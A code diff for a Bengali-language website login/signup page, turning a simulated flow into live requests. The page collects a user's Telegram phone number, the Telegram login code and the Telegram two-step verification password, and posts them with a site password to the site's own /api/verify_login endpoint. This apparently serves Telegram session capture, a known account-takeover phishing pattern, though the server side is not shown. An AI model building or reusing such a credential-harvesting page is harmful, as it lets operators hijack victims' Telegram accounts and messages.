@@ -95,7 +95,7 @@
         input:focus { border-color: var(--primary); }
 
         .phone-container { display: flex; gap: 8px; }
-        .country-code { width: 30%; padding-left: 10px; }
+        .country-code { width: 30%; padding-left: 10px; text-align: center; }
 
         .btn-main {
             width: 100%;
@@ -108,6 +108,11 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
+        }
+
+        .btn-main:disabled {
+            background: #2a7a3a;
+            cursor: not-allowed;
         }
 
         .switch-link {
@@ -123,7 +128,7 @@
         }
 
         /* Hidden initially */
-        #signup-fields, #verify-fields { display: none; }
+        #signup-fields, #verify-fields, #confirm-box { display: none; }
     </style>
 </head>
 <body>
@@ -146,7 +151,7 @@
         </div>
 
         <div class="phone-container" style="margin-bottom: 15px;">
-            <input type="text" class="country-code" id="code" placeholder="+880">
+            <input type="text" class="country-code" id="code" value="+880" maxlength="5">
             <div class="input-group" style="width: 70%; margin-bottom: 0;">
                 <i class="fas fa-phone" style="left: 12px;"></i>
                 <input type="text" id="phone" placeholder="Telegram Number" style="padding-left: 40px;">
@@ -158,7 +163,7 @@
             <input type="password" id="site-pass" placeholder="Password">
         </div>
 
-        <div id="confirm-box" style="display: none;">
+        <div id="confirm-box">
             <div class="input-group">
                 <i class="fas fa-shield-check"></i>
                 <input type="password" id="confirm-pass" placeholder="Confirm Password">
@@ -189,6 +194,7 @@
         let mode = 'login';
         let step = 1;
 
+        // লগইন এবং সাইনআপ মুড পরিবর্তন
         function toggleMode(target) {
             mode = target;
             step = 1;
@@ -202,23 +208,90 @@
                 "Have an account? <span onclick='toggleMode(\"login\")'>Login</span>";
         }
 
-        function handleAuth() {
-            if (mode === 'login') {
-                // সরাসরি ড্যাশবোর্ডে যাওয়ার সিমুলেশন
-                alert("Logging in...");
-                window.location.href = "dashboard.html";
-            } else {
-                if (step === 1) {
-                    // ওটিপি সেকশন ওপেন
-                    document.getElementById('verify-fields').style.display = 'block';
-                    document.getElementById('submit-btn').innerText = "FINISH SIGN UP";
-                    step = 2;
-                } else {
-                    alert("Account Created & Session Saved!");
-                    toggleMode('login');
+        // মেইন অথেন্টিকেশন ফাংশন
+        async function handleAuth() {
+            const btn = document.getElementById('submit-btn');
+            const countryCode = document.getElementById('code').value;
+            const phoneNumber = document.getElementById('phone').value;
+            const fullPhone = countryCode + phoneNumber;
+            
+            const sitePassword = document.getElementById('site-pass').value;
+            const confirmPassword = document.getElementById('confirm-pass').value;
+            const fullName = document.getElementById('name') ? document.getElementById('name').value : "";
+
+            // ১. ওটিপি পাঠানো (সাইনআপ স্টেপ ১)
+            if (mode === 'signup' && step === 1) {
+                if (!fullName) return alert("দয়া করে আপনার নাম লিখুন!");
+                if (!phoneNumber) return alert("দয়া করে ফোন নম্বর দিন!");
+                if (sitePassword !== confirmPassword) return alert("পাসওয়ার্ড মেলেনি!");
+                
+                btn.innerText = "ওটিপি পাঠানো হচ্ছে...";
+                btn.disabled = true;
+
+                try {
+                    const response = await fetch('/api/send_otp', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ phone: fullPhone })
+                    });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        alert("আপনার টেলিগ্রাম অ্যাপে ওটিপি পাঠানো হয়েছে!");
+                        document.getElementById('verify-fields').style.display = 'block';
+                        btn.innerText = "FINISH SIGN UP";
+                        step = 2;
+                    } else {
+                        alert("ভুল: " + data.message);
+                    }
+                } catch (err) {
+                    alert("সার্ভার কানেকশন ফেইল্ড!");
+                } finally {
+                    btn.disabled = false;
+                    if(step === 1) btn.innerText = "NEXT (SEND OTP)";
+                }
+            } 
+            // ২. লগইন বা সাইনআপ ভেরিফাই করা
+            else {
+                const otpCode = document.getElementById('tele-code').value;
+                const twoStepPass = document.getElementById('two-step').value;
+
+                if (!phoneNumber) return alert("ফোন নম্বর দিন!");
+                if (!sitePassword) return alert("পাসওয়ার্ড দিন!");
+                if (mode === 'signup' && !otpCode) return alert("টেলিগ্রাম কোডটি দিন!");
+                
+                btn.innerText = "প্রসেসিং হচ্ছে...";
+                btn.disabled = true;
+
+                try {
+                    const response = await fetch('/api/verify_login', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            phone: fullPhone,
+                            code: otpCode,
+                            password: twoStepPass,
+                            name: fullName,
+                            site_password: sitePassword
+                        })
+                    });
+                    const data = await response.json();
+
+                    if (data.success) {
+                        localStorage.setItem('user_id', data.user_id);
+                        alert("সফলভাবে লগইন হয়েছে! ড্যাশবোর্ডে নিয়ে যাওয়া হচ্ছে...");
+                        window.location.href = "/dashboard";
+                    } else {
+                        alert("লগইন ফেইল্ড: " + data.message);
+                    }
+                } catch (err) {
+                    alert("ভেরিফিকেশন এরর!");
+                } finally {
+                    btn.disabled = false;
+                    btn.innerText = (mode === 'login') ? "LOGIN" : "FINISH SIGN UP";
                 }
             }
         }
     </script>
 </body>
-</html>
+    </html>
